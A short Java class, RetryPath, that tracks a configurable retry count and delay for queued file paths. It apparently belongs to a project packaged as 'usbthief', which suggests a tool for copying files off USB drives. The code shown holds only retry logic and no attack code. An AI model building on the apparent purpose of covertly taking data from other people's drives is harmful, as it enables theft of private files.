package com.superredrock.usbthief.core;

import com.superredrock.usbthief.core.config.ConfigManager;
import com.superredrock.usbthief.core.config.ConfigSchema;
import java.nio.file.Path;
import java.util.concurrent.TimeUnit;

public class RetryPath extends DelayedPath {
    private int times = ConfigManager.getInstance().get(ConfigSchema.RETRY_COUNT);

    public RetryPath(Path path, int delay) {
        super(path, delay);
    }

    @Override
    public long getDelay(TimeUnit unit) {
        if (times <= 0){
            return Long.MAX_VALUE;
        }
        return super.getDelay(unit);
    }

    public int getTimes() {
        return times;
    }
    public void decrease() {
        times--;
    }

}
